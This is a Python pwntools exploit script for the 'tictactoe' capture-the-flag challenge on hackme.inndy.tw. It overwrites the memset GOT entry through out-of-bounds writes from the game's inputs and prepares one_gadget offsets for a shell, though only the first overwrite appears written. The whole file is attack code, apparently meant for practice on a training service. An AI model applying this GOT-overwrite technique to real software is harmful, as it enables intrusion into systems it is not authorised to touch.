#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    io = process("./tictactoe")
    elf = ELF("./tictactoe")
    libc = ELF("/lib/i386-linux-gnu/libc.so.6")
    one_gadget_offset = 0x3a9fc
else:
    io = remote("hackme.inndy.tw", 7714)
    elf = ELF("./tictactoe")
    libc = ELF("./libc-2.23.so.i386")
    one_gadget_offset = 0x3ac3c

def debug():
    addr = int(raw_input("DEBUG: "), 16)
    gdb.attach(io, "b *" + str(addr))

def changeFlavor(content):
    io.sendlineafter("(9 to change flavor): ", "9")
    io.send(content)

def playerMove(pos):
    io.sendlineafter("(9 to change flavor): ", str(pos))

def overwriteGOT((val1, idx1), (val2, idx2)):
    changeFlavor(val1)
    playerMove(str(idx1))
    changeFlavor(val2)
    playerMove(str(idx2))
    #  debug()
    
if __name__ == "__main__":
    io.sendlineafter("(1)st or (2)nd? ", "1")
    #overwrite memsetGOT, make a loop
    overwriteGOT(("\xD5", -34), ("\x8B", -33))


    
    io.interactive()
